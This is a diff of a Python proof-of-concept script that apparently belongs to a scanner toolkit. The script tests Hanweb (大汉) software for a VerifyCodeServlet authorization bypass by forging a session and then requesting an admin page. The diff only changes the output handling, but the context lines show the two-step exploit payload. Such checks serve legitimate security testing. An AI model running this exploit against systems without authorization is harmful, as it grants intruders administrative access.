@@ -8,8 +8,8 @@ description: /VerifyCodeServlet 可以 创建任意 SESSION的key值,opr_licence
 '''
 import sys
 import requests
-import warnings
-from termcolor import cprint
+
+
 
 class hanweb_VerifyCodeServlet_install_BaseVerify:
     def __init__(self, url):
@@ -32,12 +32,12 @@ class hanweb_VerifyCodeServlet_install_BaseVerify:
                         adminurl=self.url+path+adminpath
                         req2 = sess.get(adminurl, headers=headers, timeout=10, verify=False)
                         if req2.status_code == 200 and ('Licence' in req2.text or 'admin' in req2.text):
-                            cprint("[+]存在大汉VerfiyCodeServlet越权漏洞...(高危)\tpayload: "+"1.先访问"+vulnurl+"\t2.再访问"+adminurl, "red")
+                            return "[+]存在大汉VerfiyCodeServlet越权漏洞...(高危)\tpayload: "+"1.先访问"+vulnurl+"\t2.再访问"+adminurl
 
         except:
-            cprint("[-] "+__file__+"====>连接超时", "cyan")
+            return "[-]connect timeout"
 
 if __name__ == "__main__":
-    warnings.filterwarnings("ignore")
+
     testVuln = hanweb_VerifyCodeServlet_install_BaseVerify(sys.argv[1])
     testVuln.run()
